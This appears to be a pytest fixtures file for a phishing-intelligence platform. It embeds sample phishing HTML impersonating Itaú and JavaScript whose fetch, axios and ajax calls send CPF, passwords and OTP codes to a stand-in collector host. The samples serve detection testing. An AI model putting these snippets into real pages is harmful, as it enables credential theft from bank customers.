"""Fixtures compartilhadas da suite de testes da plataforma phishing_intel."""

from __future__ import annotations

from collections.abc import Generator

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session, sessionmaker

import database.session as db_session_module
from config.settings import KnownBrand, PhishingIntelSettings
from database.models import Base

SAMPLE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Itau - Confirme seus dados</title>
    <meta name="description" content="Portal seguro Itau Personnalite">
    <link rel="stylesheet" href="/assets/style.css">
    <!-- kit-version: 3.1.2 -->
</head>
<body>
    <img src="/assets/logo-itau.png" class="logo">
    <form id="login-form" action="https://collector.evil-domain.test/api/collect" method="POST">
        <input type="text" name="cpf" id="cpf" placeholder="Digite seu CPF">
        <input type="password" name="senha" id="senha" placeholder="Senha">
        <input type="hidden" name="csrf_token" value="abc123">
        <button type="submit">Entrar</button>
    </form>
    <a href="https://www.itau.com.br/institucional">Sobre o Itau</a>
    <script src="/assets/app.js"></script>
    <script>
        console.log("inline script");
    </script>
</body>
</html>
"""

SAMPLE_JS = """
function submitCredentials(data) {
    fetch("https://collector.evil-domain.test/api/collect", {
        method: "POST",
        body: JSON.stringify(data)
    });
}

const apiKey = "api_key: 'sk_live_1234567890abcdef'";
axios.post("https://collector.evil-domain.test/api/v2/otp", {otp: data.otp});
$.ajax({url: "https://collector.evil-domain.test/legacy/collect", type: "POST"});
"""


@pytest.fixture()
def sample_html() -> str:
    return SAMPLE_HTML


@pytest.fixture()
def sample_js() -> str:
    return SAMPLE_JS


@pytest.fixture()
def known_brands() -> list[KnownBrand]:
    return [
        KnownBrand(
            name="itau",
            category="financial_institution",
            keywords=["itau", "personnalite"],
            domains=["itau.com.br"],
        ),
        KnownBrand(
            name="nubank",
            category="fintech",
            keywords=["nubank", "nuconta"],
            domains=["nubank.com.br"],
        ),
    ]


@pytest.fixture()
def test_settings(known_brands: list[KnownBrand]) -> PhishingIntelSettings:
    raw = {
        "database": {"url": "sqlite:///:memory:", "echo": False},
        "misp": {"url": "https://misp.test", "api_key": "TEST-KEY", "verify_cert": False},
        "brands": {"known_brands": [brand.model_dump() for brand in known_brands]},
    }
    return PhishingIntelSettings.model_validate(raw)


@pytest.fixture()
def db_session() -> Generator[Session, None, None]:
    """Fornece uma sessao SQLAlchemy isolada, com esquema criado em SQLite em memoria."""
    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    factory = sessionmaker(bind=engine, expire_on_commit=False)
    session = factory()
    try:
        yield session
    finally:
        session.close()
        engine.dispose()


@pytest.fixture(autouse=True)
def _reset_session_cache() -> Generator[None, None, None]:
    """Garante que o cache de engine/sessao do modulo `database.session` nao vaze entre testes."""
    db_session_module.reset_engine_cache()
    yield
    db_session_module.reset_engine_cache()
